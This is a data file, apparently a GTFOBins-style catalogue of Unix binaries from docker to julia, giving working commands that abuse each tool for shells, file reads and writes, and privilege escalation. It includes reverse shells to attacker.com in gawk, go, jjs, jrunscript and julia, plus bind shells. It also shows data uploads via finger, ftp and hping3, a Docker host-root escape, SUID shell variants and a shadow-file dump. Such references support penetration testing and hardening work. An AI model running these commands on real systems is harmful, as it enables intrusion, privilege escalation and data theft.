    "file-write": [{"code": "echo DATA >/path/to/temp-file\ndocker cp /path/to/temp-file $CONTAINER_ID:temp-file\ndocker cp $CONTAINER_ID /path/to/output-file", "comment": "Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host."}],
    "shell": [{"code": "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh"}, {"code": "docker run --rm -it --privileged -u root alpine\nmount /dev/sda1 /mnt/\nls -la /mnt/\nchroot /mnt /bin/bash", "comment": "This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`."}]
  },
  "dos2unix": {
    name: "dos2unix",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "dos2unix -f -O /path/to/input-file"}],
    "file-write": [{"code": "dos2unix -f -n /path/to/input-file /path/to/output-file"}]
  },
  "dosbox": {
    name: "dosbox",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "dosbox -c 'mount c /' -c 'type c:\\path\\to\\input'", "comment": "The file content will be displayed in the DOSBox graphical window."}, {"code": "dosbox -c 'mount c /' -c 'copy c:\\path\\to\\input c:\\path\\to\\output' -c exit\ncat /path/to/OUTPUT", "comment": "The file is copied to a readable location."}],
    "file-write": [{"code": "dosbox -c 'mount c /' -c \"echo DATA >c:\\path\\to\\output\" -c exit", "comment": "Note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."}]
  },
  "dotnet": {
    name: "dotnet",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "dotnet fsi\nSystem.IO.File.ReadAllText(\"/path/to/input-file\");;"}],
    "shell": [{"code": "dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"}]
  },
  "dpkg": {
    name: "dpkg",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "dpkg -l"}],
    "shell": [{"code": "dpkg -i x_1.0_all.deb", "comment": "Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho 'exec /bin/sh' >x.sh\nfpm -n x -s dir -t deb -a all --before-install x.sh .\n```"}]
  },
  "dstat": {
    name: "dstat",
    functions: ["inherit"],
    "inherit": [{"code": "dstat --xxx", "comment": "`dstat` allows you to run arbitrary Python scripts loaded as \"external plugins\" if they are located in one of the directories, stated in the `dstat` man page under \"FILES\":\n\n- `~/.dstat/`\n- `(path of binary)/plugins/`\n- `/usr/share/dstat/`\n- `/usr/local/share/dstat/`\n\nPick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file."}]
  },
  "dvips": {
    name: "dvips",
    functions: ["shell"],
    "shell": [{"code": "dvips -R0 texput.dvi", "comment": "The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.\n\n```\ntex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n```"}]
  },
  "easy_install": {
    name: "easy_install",
    functions: ["inherit"],
    "inherit": [{"code": "echo '...' >setup.py\neasy_install .", "comment": "This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).\n\nKeep in mind that the TTY is lost, so `/dev/tty` can be used, for example:\n\n```\necho 'import os; os.system(\"exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty\")' >setup.py\n```"}]
  },
  "easyrsa": {
    name: "easyrsa",
    functions: ["shell"],
    "shell": [{"code": "echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file\neasyrsa --vars=/path/to/temp-file", "comment": "This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice."}]
  },
  "eb": {
    name: "eb",
    functions: ["inherit"],
    "inherit": [{"code": "eb logs"}]
  },
  "ed": {
    name: "ed",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "ed /path/to/input-file\n,p\nq"}],
    "file-write": [{"code": "ed /path/to/output-file\na\nDATA\n.\nw\nq"}],
    "shell": [{"code": "ed\n!/bin/sh\nq"}]
  },
  "efax": {
    name: "efax",
    functions: ["file-read"],
    "file-read": [{"code": "efax -d /path/to/input-file", "comment": "The content is actually parsed by the command."}]
  },
  "egrep": {
    name: "egrep",
    functions: ["file-read"],
    "file-read": [{"code": "grep '' /path/to/input-file"}]
  },
  "elvish": {
    name: "elvish",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "elvish -c 'print (slurp </path/to/input-file)'"}],
    "file-write": [{"code": "elvish -c 'print DATA >/path/to/output-file'"}],
    "shell": [{"code": "elvish"}]
  },
  "emacs": {
    name: "emacs",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "emacs /path/to/input-file"}],
    "file-write": [{"code": "emacs /path/to/output-file\nDATA\nC-x C-s"}],
    "shell": [{"code": "emacs -Q -nw --eval '(term \"/bin/sh\")'"}]
  },
  "enscript": {
    name: "enscript",
    functions: ["shell"],
    "shell": [{"code": "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"}]
  },
  "env": {
    name: "env",
    functions: ["shell"],
    "shell": [{"code": "env /bin/sh", "suid_code": "env /bin/sh -p"}]
  },
  "eqn": {
    name: "eqn",
    functions: ["file-read"],
    "file-read": [{"code": "eqn /path/to/input-file", "comment": "The content is actually parsed and corrupted by the command."}]
  },
  "espeak": {
    name: "espeak",
    functions: ["file-read"],
    "file-read": [{"code": "espeak -qXf /path/to/input-file", "comment": "The file content appears in the middle of other textual information as phonemes."}]
  },
  "ex": {
    name: "ex",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "ex"}],
    "shell": [{"code": "ex -c ':!/bin/sh'"}]
  },
  "exiftool": {
    name: "exiftool",
    functions: ["file-read", "file-write", "inherit"],
    "file-read": [{"code": "exiftool -filename=/path/to/output-file /path/to/input-file\ncat /path/to/output-file", "comment": "If the permissions allow it, files are moved (instead of copied) to the destination."}],
    "file-write": [{"code": "exiftool -filename=/path/to/output-file /path/to/input-file", "comment": "If the permissions allow it, files are moved (instead of copied) to the destination."}, {"code": "exiftool \"-description<=/path/to/input-file --filename /path/to/output-file", "comment": "The output file must exists, either empty or be a supported image file. The content is written amidst other content."}, {"code": "exiftool \"-description=DATA --filename /path/to/output-file", "comment": "The output file must exists, either empty or be a supported image file. The content is written amidst other content."}, {"code": "exiftool -description -W /path/to/output-file --filename /path/to/input-file", "comment": "Writes the metadata tags of the input file in textual format to the output."}],
    "inherit": [{"code": "exiftool -if '...' /etc/passwd", "comment": "This allows to run Perl code (`...`)."}]
  },
  "expand": {
    name: "expand",
    functions: ["file-read"],
    "file-read": [{"code": "expand /path/to/input-file", "comment": "The read file content is corrupted by replacing tabs with spaces."}]
  },
  "expect": {
    name: "expect",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "expect /path/to/input-file", "comment": "The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message."}],
    "shell": [{"code": "expect -c 'spawn /bin/sh;interact'", "suid_code": "expect -c 'spawn /bin/sh -p;interact'"}]
  },
  "facter": {
    name: "facter",
    functions: ["inherit"],
    "inherit": [{"code": "FACTERLIB=/path/to/dir/ facter", "comment": "The first `.rb` file in the `/path/to/dir/` directory will be executed."}, {"code": "facter --custom-dir=/path/to/dir/ x", "comment": "The first `.rb` file in the `/path/to/dir/` directory will be executed."}]
  },
  "fail2ban-client": {
    name: "fail2ban-client",
    functions: ["command"],
    "command": [{"code": "fail2ban-client add x\nfail2ban-client set x addaction x\nfail2ban-client set x action x actionban /path/to/command\nfail2ban-client start x\nfail2ban-client set x banip 999.999.999.999\nfail2ban-client set x unbanip 999.999.999.999\nfail2ban-client stop x", "comment": "The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns."}, {"code": "cat >/path/to/temp-dir/fail2ban.conf <<EOF\n[Definition]\nEOF\n\ncat >/path/to/temp-dir/jail.local <<EOF\n[x]\nenabled = true\naction = x\nEOF\n\nmkdir -p /path/to/temp-dir/action.d/\ncat >/path/to/temp-dir/action.d/x.conf <<EOF\n[Definition]\nactionstart = /path/to/command\nEOF\n\nmkdir -p /path/to/temp-dir/filter.d/\ncat >/path/to/temp-dir/filter.d/x.conf <<EOF\n[Definition]\nEOF\n\nfail2ban-client -c /path/to/temp-dir/ -v restart"}]
  },
  "fastfetch": {
    name: "fastfetch",
    functions: ["command", "file-read", "shell"],
    "command": [{"code": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /path/to/command\"}]}' >/path/to/temp-file.jsonc\nfastfetch -c /path/to/temp-file.jsonc"}],
    "file-read": [{"code": "fastfetch --file /path/to/input-file", "comment": "The file content is used as the logo while some other information is displayed on its right."}],
    "shell": [{"code": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /bin/sh 1>&0 2>&0\"}]}' >/path/to/temp-file.jsonc\nfastfetch -c /path/to/temp-file.jsonc"}]
  },
  "ffmpeg": {
    name: "ffmpeg",
    functions: ["library-load"],
    "library-load": [{"code": "ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav\nreset^J"}]
  },
  "fgrep": {
    name: "fgrep",
    functions: ["file-read"],
    "file-read": [{"code": "grep '' /path/to/input-file"}]
  },
  "file": {
    name: "file",
    functions: ["file-read"],
    "file-read": [{"code": "file -f /path/to/input-file", "comment": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation."}, {"code": "file -m /path/to/input-file", "comment": "Each line is corrupted by a prefix string and wrapped inside quotes.\n\nIf a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.\n\nIt can also be provided with a directory and will read each file in the directory."}]
  },
  "find": {
    name: "find",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "find /path/to/input-file -exec cat {} \\;", "comment": "This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`."}],
    "file-write": [{"code": "find / -fprintf /path/to/output-file DATA -quit", "comment": "`DATA` is a format string, it supports some escape sequences."}],
    "shell": [{"code": "find . -exec /bin/sh \\; -quit", "suid_code": "find . -exec /bin/sh -p \\; -quit"}]
  },
  "finger": {
    name: "finger",
    functions: ["download", "upload"],
    "download": [{"code": "finger x@attacker.com", "comment": "The command hangs waiting for the remote peer to close the socket."}],
    "upload": [{"code": "finger DATA@attacker.com", "comment": "The command hangs waiting for the remote peer to close the socket."}]
  },
  "firejail": {
    name: "firejail",
    functions: ["shell"],
    "shell": [{"code": "firejail /bin/sh"}]
  },
  "fish": {
    name: "fish",
    functions: ["shell"],
    "shell": [{"code": "fish"}]
  },
  "flock": {
    name: "flock",
    functions: ["shell"],
    "shell": [{"code": "flock -u / /bin/sh", "suid_code": "flock -u / /bin/sh -p"}]
  },
  "fmt": {
    name: "fmt",
    functions: ["file-read"],
    "file-read": [{"code": "fmt -pNON_EXISTING_PREFIX /path/to/input-file"}, {"code": "fmt -999 /path/to/input-file", "comment": "This corrupts the output by wrapping very long lines at the given width (`999`)."}]
  },
  "fold": {
    name: "fold",
    functions: ["file-read"],
    "file-read": [{"code": "fold -w999 /path/to/input-file", "comment": "This corrupts the output by wrapping very long lines at the given width (`999`)."}]
  },
  "forge": {
    name: "forge",
    functions: ["shell"],
    "shell": [{"code": "echo '#!/bin/sh' >/path/to/temp-file\necho -e \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" >>/path/to/temp-file\nchmod +x /path/to/temp-file\nforge build --use /path/to/temp-file"}]
  },
  "fping": {
    name: "fping",
    functions: ["file-read"],
    "file-read": [{"code": "fping -f /path/to/input-file", "comment": "Each line is treated as an hostname and it's leaked as an error message."}]
  },
  "ftp": {
    name: "ftp",
    functions: ["download", "shell", "upload"],
    "download": [{"code": "ftp -a attacker.com\nget /path/to/input-file output-file", "comment": "Instead of `-a`, credentials can be supplied via the `user:password@host` connection string."}],
    "shell": [{"code": "ftp\n!/bin/sh"}],
    "upload": [{"code": "ftp -a attacker.com\nput /path/to/input-file output-file", "comment": "Instead of `-a`, credentials can be supplied via the `user:password@host` connection string."}]
  },
  "fzf": {
    name: "fzf",
    functions: ["command", "shell"],
    "command": [{"code": "fzf --listen=12345", "comment": "Commands can be issued via POST requests, for example:\n\n```\ncurl http://localhost:12345 -d 'execute(/path/to/command)'\n```"}],
    "shell": [{"code": "fzf --bind 'enter:execute(/bin/sh)'", "comment": "Press `Enter` to receive the shell."}]
  },
  "gawk": {
    name: "gawk",
    functions: ["bind-shell", "file-read", "file-write", "reverse-shell", "shell"],
    "bind-shell": [{"code": "gawk 'BEGIN {\n    s = \"/inet/tcp/12345/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"}],
    "file-read": [{"code": "gawk '//' /path/to/input-file"}],
    "file-write": [{"code": "gawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}],
    "reverse-shell": [{"code": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/attacker.com/12345\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"}],
    "shell": [{"code": "gawk 'BEGIN {system(\"/bin/sh\")}'"}]
  },
  "gcc": {
    name: "gcc",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "gcc -x c -E /path/to/input-file"}, {"code": "gcc @/path/to/input-file", "comment": "The file is read and parsed as a list of files (one per line), the content is displayed as error messages."}],
    "file-write": [{"code": "gcc -x c /dev/null -o /path/to/input-file", "comment": "This actually deletes the file."}],
    "shell": [{"code": "gcc -wrapper /bin/sh,-s x", "comment": "In some older versions, the `x` argument must instead reference any existing file."}]
  },
  "gcloud": {
    name: "gcloud",
    functions: ["inherit"],
    "inherit": [{"code": "gcloud help"}]
  },
  "gcore": {
    name: "gcore",
    functions: ["file-read"],
    "file-read": [{"code": "gcore $PID", "comment": "It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information."}]
  },
  "gdb": {
    name: "gdb",
    functions: ["file-write", "inherit", "shell"],
    "file-write": [{"code": "gdb -nx -ex 'dump value /path/to/output-file \"DATA\"' -ex quit"}],
    "inherit": [{"code": "gdb -nx -ex 'python ...' -ex quit", "comment": "This allows to run Python code (`...`)."}],
    "shell": [{"code": "gdb -nx -ex '!/bin/sh' -ex quit"}]
  },
  "gem": {
    name: "gem",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "gem open debug", "comment": "This requires the name of an installed gem to be provided, e.g., `debug` is usually installed."}, {"code": "gem build /path/to/script.rb"}, {"code": "gem install --file /path/to/script.rb"}],
    "shell": [{"code": "gem open -e '/bin/sh -s' debug", "comment": "This requires the name of an installed gem to be provided, e.g., `debug` is usually installed."}]
  },
  "genie": {
    name: "genie",
    functions: ["shell"],
    "shell": [{"code": "genie -c '/bin/sh'"}]
  },
  "genisoimage": {
    name: "genisoimage",
    functions: ["file-read"],
    "file-read": [{"code": "genisoimage -q -o - /path/to/input-file", "comment": "The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`."}, {"code": "genisoimage -sort /path/to/input-file", "comment": "The file is parsed, and some of its content is disclosed by the error messages."}]
  },
  "getent": {
    name: "getent",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "getent shadow", "comment": "This allows to dump password hashes from the `/etc/shadow` file."}]
  },
  "ghc": {
    name: "ghc",
    functions: ["shell"],
    "shell": [{"code": "ghc -e 'System.Process.callCommand \"/bin/sh\"'"}]
  },
  "ghci": {
    name: "ghci",
    functions: ["shell"],
    "shell": [{"code": "ghci\nSystem.Process.callCommand \"/bin/sh\""}]
  },
  "gimp": {
    name: "gimp",
    functions: ["inherit"],
    "inherit": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b '...'", "comment": "This allows to run Python code (`...`). It hangs afterwards and can be terminated by pressing `Ctrl-C`."}]
  },
  "ginsh": {
    name: "ginsh",
    functions: ["shell"],
    "shell": [{"code": "ginsh\n!/bin/sh"}]
  },
  "git": {
    name: "git",
    functions: ["file-read", "file-write", "inherit", "shell"],
    "file-read": [{"code": "git diff /dev/null /path/to/input-file", "comment": "The read file content is displayed in `diff` style output format."}],
    "file-write": [{"code": "git apply --unsafe-paths --directory / x.patch", "comment": "The patch can be created locally by creating the file that will be written on the target using its absolute path:\n\n```\necho DATA >/path/to/input-file\ngit diff /dev/null /path/to/input-file >x.patch\n```"}],
    "inherit": [{"code": "git help config"}, {"code": "git branch --help config\n!/bin/sh", "comment": "The help system can also be reached from any `git` command, e.g., `git branch`."}],
    "shell": [{"code": "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help"}, {"code": "git init .\necho 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\ngit -C . commit --allow-empty -m x", "comment": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too."}, {"code": "ln -s /bin/sh git-x\ngit --exec-path=. x", "suid_code": "ln -s /bin/sh git-x\ngit --exec-path=. x -p"}]
  },
  "gnuplot": {
    name: "gnuplot",
    functions: ["shell"],
    "shell": [{"code": "gnuplot -e 'system(\"/bin/sh 1>&0\")'"}]
  },
  "go": {
    name: "go",
    functions: ["bind-shell", "file-read", "file-write", "reverse-shell", "shell"],
    "bind-shell": [{"code": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\taddr := &syscall.SockaddrInet4{Port: 12345}\\n\\tcopy(addr.Addr[:], []byte{0,0,0,0})\\n\\tsyscall.Bind(fd, addr)\\n\\tsyscall.Listen(fd, 1)\\n\\tnfd, _, _ := syscall.Accept(fd)\\n\\tsyscall.Dup2(nfd, 0)\\n\\tsyscall.Dup2(nfd, 1)\\n\\tsyscall.Dup2(nfd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"}],
    "file-read": [{"code": "echo -e 'package main\\nimport (\\n\\t\"fmt\"\\n\\t\"os\"\\n)\\n\\nfunc main(){\\n\\tb, _ := os.ReadFile(\"/path/to/input-file\")\\n\\tfmt.Print(string(b))\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"}],
    "file-write": [{"code": "echo -e 'package main\\nimport \"os\"\\nfunc main(){\\n\\tf, _ := os.OpenFile(\"/path/to/output-file\", os.O_RDWR|os.O_CREATE, 0644)\\n\\tf.Write([]byte(\"DATA\\\\n\"))\\n\\tf.Close()\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"}],
    "reverse-shell": [{"code": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"net\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\tip := net.ParseIP(\"attacker.com\").To4()\\n\\taddr := &syscall.SockaddrInet4{Port: 12345}\\n\\tcopy(addr.Addr[:], ip)\\n\\tsyscall.Connect(fd, addr)\\n\\tsyscall.Dup2(fd, 0)\\n\\tsyscall.Dup2(fd, 1)\\n\\tsyscall.Dup2(fd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"}],
    "shell": [{"code": "echo -e 'package main\\nimport \"syscall\"\\nfunc main(){\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, []string{})\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"}]
  },
  "grc": {
    name: "grc",
    functions: ["shell"],
    "shell": [{"code": "grc --pty /bin/sh"}]
  },
  "grep": {
    name: "grep",
    functions: ["file-read"],
    "file-read": [{"code": "grep '' /path/to/input-file"}]
  },
  "gtester": {
    name: "gtester",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "gtester DATA -o /path/to/output-file", "comment": "Data to be written appears in an XML attribute in the output file (`<testbinary path=\"DATA\">`)."}],
    "shell": [{"code": "echo 'exec /bin/sh 0<&1' >/path/to/temp-file\nchmod +x /path/to/temp-file\ngtester -q /path/to/temp-file", "suid_code": "echo '#!/bin/sh -p' >/path/to/temp-file\necho 'exec /bin/sh -p 0<&1' >>/path/to/temp-file\nchmod +x /path/to/temp-file\ngtester -q /path/to/temp-file"}]
  },
  "guile": {
    name: "guile",
    functions: ["shell"],
    "shell": [{"code": "guile -c '(system \"/bin/sh\")'"}]
  },
  "gzip": {
    name: "gzip",
    functions: ["file-read"],
    "file-read": [{"code": "gzip -c /path/to/input-file | gzip -d"}]
  },
  "hashcat": {
    name: "hashcat",
    functions: ["file-write"],
    "file-write": [{"code": "echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash\nhashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist", "comment": "Append data to the end of the output file, creating if does not exist."}]
  },
  "head": {
    name: "head",
    functions: ["file-read"],
    "file-read": [{"code": "head -c-0 /path/to/input-file"}]
  },
  "hexdump": {
    name: "hexdump",
    functions: ["file-read"],
    "file-read": [{"code": "hd /path/to/input-file", "comment": "The output is actually an hex dump."}]
  },
  "hg": {
    name: "hg",
    functions: ["shell"],
    "shell": [{"code": "hg --config alias.x='!/bin/sh' x"}]
  },
  "highlight": {
    name: "highlight",
    functions: ["file-read"],
    "file-read": [{"code": "highlight --no-doc --failsafe /path/to/input-file"}]
  },
  "hping3": {
    name: "hping3",
    functions: ["shell", "upload"],
    "shell": [{"code": "hping3\n/bin/sh", "suid_code": "hping3\n/bin/sh -p"}],
    "upload": [{"code": "hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file", "comment": "The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end."}]
  },
  "iconv": {
    name: "iconv",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "iconv -f 8859_1 -t 8859_1 /path/to/input-file"}],
    "file-write": [{"code": "echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file"}]
  },
  "iftop": {
    name: "iftop",
    functions: ["shell"],
    "shell": [{"code": "iftop\n!/bin/sh", "comment": "This requires the privilege to capture on some device (specify with `-i` if needed)."}]
  },
  "install": {
    name: "install",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "install -m 6777 /path/to/input-file /path/to/output-dir/", "comment": "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file."}]
  },
  "ionice": {
    name: "ionice",
    functions: ["shell"],
    "shell": [{"code": "ionice /bin/sh", "suid_code": "ionice /bin/sh -p"}]
  },
  "ip": {
    name: "ip",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "ip -force -batch /path/to/input-file", "comment": "The read file content is corrupted by error prints."}],
    "shell": [{"code": "ip netns add foo\nip netns exec foo /bin/sh\nip netns delete foo", "suid_code": "ip netns add foo\nip netns exec foo /bin/sh -p\nip netns delete foo"}, {"code": "ip netns add foo\nip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nip netns exec bar /bin/sh\nip netns delete foo\nip netns delete bar"}]
  },
  "iptables-save": {
    name: "iptables-save",
    functions: ["file-write"],
    "file-write": [{"code": "iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA\niptables -S\niptables-save -f /path/to/output-file", "comment": "The content is written along with a number of `iptables` rules."}]
  },
  "irb": {
    name: "irb",
    functions: ["inherit"],
    "inherit": [{"code": "irb\n...", "comment": "This allows to run Ruby code (`...`)."}]
  },
  "ispell": {
    name: "ispell",
    functions: ["shell"],
    "shell": [{"code": "ispell /etc/hosts\n!/bin/sh", "suid_code": "ispell /etc/hosts\n!/bin/sh -p"}]
  },
  "java": {
    name: "java",
    functions: ["shell"],
    "shell": [{"code": "java Shell", "comment": "The `Shell.class` class file can be compiled offline, then uploaded to the target:\n\n```\ncat >Shell.java <<EOF\npublic class Shell {\n    public static void main(String[] args) throws Exception {\n        new ProcessBuilder(\"/bin/sh\").inheritIO().start().waitFor();\n    }\n}\nEOF\n\njavac Shell.java\n```"}]
  },
  "jjs": {
    name: "jjs",
    functions: ["download", "file-read", "file-write", "reverse-shell", "shell"],
    "download": [{"code": "jjs\nvar URL = Java.type('java.net.URL');\nvar ws = new URL('http://attacker.com/path/to/input-file');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('/path/to/output-file');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();"}],
    "file-read": [{"code": "jjs\nvar BufferedReader = Java.type('java.io.BufferedReader');\nvar FileReader = Java.type('java.io.FileReader');\nvar br = new BufferedReader(new FileReader('/path/to/input-file'));\nwhile ((line = br.readLine()) != null) { print(line); }"}],
    "file-write": [{"code": "jjs\nvar FileWriter = Java.type('java.io.FileWriter');\nvar fw=new FileWriter('/path/to/output-file');\nfw.write('DATA');\nfw.close();"}],
    "reverse-shell": [{"code": "jjs\nvar host='attacker.com';\nvar port=12345;\nvar ProcessBuilder = Java.type('java.lang.ProcessBuilder');\nvar p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();\nvar Socket = Java.type('java.net.Socket');\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();"}],
    "shell": [{"code": "jjs\nJava.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()"}]
  },
  "joe": {
    name: "joe",
    functions: ["shell"],
    "shell": [{"code": "joe\n^K!/bin/sh", "comment": "The terminal is spawn int the terminal interface."}]
  },
  "join": {
    name: "join",
    functions: ["file-read"],
    "file-read": [{"code": "join -a 2 /dev/null /path/to/input-file"}]
  },
  "journalctl": {
    name: "journalctl",
    functions: ["inherit"],
    "inherit": [{"code": "journalctl"}]
  },
  "jq": {
    name: "jq",
    functions: ["file-read"],
    "file-read": [{"code": "jq -Rr . /path/to/input-file"}]
  },
  "jrunscript": {
    name: "jrunscript",
    functions: ["download", "file-read", "file-write", "reverse-shell", "shell"],
    "download": [{"code": "jrunscript -e 'cp(\"http://attacker.com/path/to/input-file\",\"/path/to/output-file\")'"}],
    "file-read": [{"code": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"/path/to/input-file\"));\n    while ((line = br.readLine()) != null) { print(line); }'"}],
    "file-write": [{"code": "jrunscript -e 'var fw=new java.io.FileWriter(\"/path/to/output-file\");\n    fw.write(\"DATA\");\n    fw.close();'"}],
    "reverse-shell": [{"code": "jrunscript -e 'var host=\"attacker.com\";\n    var port=12345;\n    var p=new java.lang.ProcessBuilder(\"/bin/sh\", \"-i\").redirectErrorStream(true).start();\n    var s=new java.net.Socket(host,port);\n    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\n    while(pi.available()>0)so.write(pi.read());\n    while(pe.available()>0)so.write(pe.read());\n    while(si.available()>0)po.write(si.read());\n    so.flush();po.flush();\n    java.lang.Thread.sleep(50);\n    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"}],
    "shell": [{"code": "jrunscript -e 'exec(\"/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty\")'", "suid_code": "jrunscript -e 'exec(\"/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty\")'", "suid_comment": "This has been found working in macOS but failing on Linux systems."}]
  },
  "jshell": {
    name: "jshell",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "jshell\njshell> /open /path/to/input-file", "comment": "The content is leaked as error messages."}],
    "file-write": [{"code": "jshell\nString x = \"DATA\";\n/save /path/to/output-file", "comment": "Writes only the valid Java code to file."}],
    "shell": [{"code": "jshell\nRuntime.getRuntime().exec(\"/path/to/command\");"}]
  },
  "jtag": {
    name: "jtag",
    functions: ["shell"],
    "shell": [{"code": "jtag --interactive\nshell /bin/sh"}]
  },
  "julia": {
    name: "julia",
    functions: ["download", "file-read", "file-write", "reverse-shell", "shell"],
    "download": [{"code": "julia -e 'download(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'"}],
    "file-read": [{"code": "julia -e 'print(open(f->read(f, String), \"/path/to/input-file\"))'"}],
    "file-write": [{"code": "julia -e 'open(f->write(f, \"DATA\"), /path/to/output-file, \"w\")'"}],
    "reverse-shell": [{"code": "julia -e 'using Sockets; sock=connect(\"attacker.com\", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"}],
